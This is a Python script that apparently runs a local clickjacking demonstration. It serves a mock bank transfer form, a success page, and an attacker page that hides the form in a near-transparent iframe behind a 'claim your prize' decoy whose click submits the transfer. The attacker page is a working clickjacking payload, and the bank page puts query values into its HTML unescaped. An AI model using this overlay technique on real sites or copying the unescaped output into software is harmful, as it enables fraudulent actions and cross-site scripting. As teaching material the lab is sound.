from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        def get(key):
            return params.get(key, [''])[0]

        # ----------------------------------------
        # VICTIM PAGE
        # ----------------------------------------
        if parsed.path == '/victim':
            name    = get('name')
            account = get('account')
            amount  = get('amount')

            html = f"""<!DOCTYPE html>
<html>
<head><title>Bank Transfer</title></head>
<body>

<h2>Bank Fund Transfer</h2>

<form action="/success" method="GET" target="_top">
    Name:<br>
    <input type="text" name="name" value="{name}"><br><br>

    Account No:<br>
    <input type="text" name="account" value="{account}"><br><br>

    Amount:<br>
    <input type="text" name="amount" value="{amount}"><br><br>

    <input type="submit" value="Transfer Now">
</form>

</body>
</html>"""

        # ----------------------------------------
        # SUCCESS PAGE
        # ----------------------------------------
        elif parsed.path == '/success':
            name    = get('name')
            account = get('account')
            amount  = get('amount')

            html = f"""<!DOCTYPE html>
<html>
<head><title>Transfer Done</title></head>
<body>

<h2 style="color:green;">Transfer Successful!</h2>

<p>Name: {name}</p>
<p>Account: {account}</p>
<p>Amount: Rs.{amount}</p>

<br>
<p style="color:red;">** Victim had no idea. They clicked a prize button. **</p>

</body>
</html>"""

        # ----------------------------------------
        # ATTACKER PAGE
        # ----------------------------------------
        elif parsed.path == '/attacker':
            html = """<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
    <style>
        #wrapper {
            position: relative;
            width: 350px;
            height: 220px;
        }
        #decoy {
            position: absolute;
            top: 0; left: 0;
            width: 350px;
            height: 220px;
            background: yellow;
            text-align: center;
            padding-top: 80px;
            font-size: 18px;
            cursor: pointer;
            z-index: 2;
            box-sizing: border-box;
        }
        #victim-frame {
            position: absolute;
            top: 0; left: 0;
            width: 350px;
            height: 220px;
            opacity: 0.00001;
            z-index: 1;
            border: none;
        }
    </style>
</head>
<body>

<h2>Attacker Page</h2>
<p>User sees yellow button. Hidden bank form is behind it.</p>

<div id="wrapper">

    <iframe
        id="victim-frame"
        src="http://127.0.0.1:8000/victim?name=Mohammed&account=9876543210&amount=50000">
    </iframe>

    <div id="decoy" onclick="submitForm()">
        Click here to claim your prize!
    </div>

</div>

<script>
    function submitForm() {
        var iframe = document.getElementById('victim-frame');
        var doc = iframe.contentDocument || iframe.contentWindow.document;
        doc.querySelector('form').submit();
    }
</script>

</body>
</html>"""

        # ----------------------------------------
        # DEFAULT
        # ----------------------------------------
        else:
            html = "<h2>Go to /attacker or /victim</h2>"

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        print(f"  REQUEST: {args[0]} {args[1]}")

print("Server running at http://127.0.0.1:8000")
print("Open attacker page: http://127.0.0.1:8000/attacker")
print("Open victim page:   http://127.0.0.1:8000/victim?name=Mohammed&account=9876543210&amount=50000")

HTTPServer(('', 8000), Handler).serve_forever()
